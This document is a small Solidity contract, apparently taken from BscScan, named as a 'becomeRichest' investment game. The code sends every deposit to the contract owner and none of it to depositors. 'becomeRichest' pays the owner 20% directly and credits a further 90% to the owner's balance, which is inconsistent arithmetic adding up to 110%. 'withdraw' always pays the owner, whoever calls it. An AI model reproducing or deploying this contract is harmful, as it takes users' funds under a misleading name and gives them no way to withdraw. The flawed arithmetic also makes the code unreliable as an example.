/**
 *Submitted for verification at BscScan.com on 2022-02-12
*/

pragma solidity >0.4.22<0.7.1;

contract Contracting{

   address payable public owner;
   uint256 invested=0;
   mapping (address => uint) pendingWithdrawals;

constructor() public  {
      owner = msg.sender;

   }
function becomeRichest() public payable returns (bool) {
        
        owner.transfer(msg.value/5);
        pendingWithdrawals[owner] += (msg.value*90)/100;
        invested+=(msg.value*90)/100;
         return true;
   }
   function withdraw() public {
     
      uint amount = pendingWithdrawals[msg.sender];
      pendingWithdrawals[msg.sender] = 0;
      owner.transfer(amount);
      invested = 0;
   }



  
 
  
}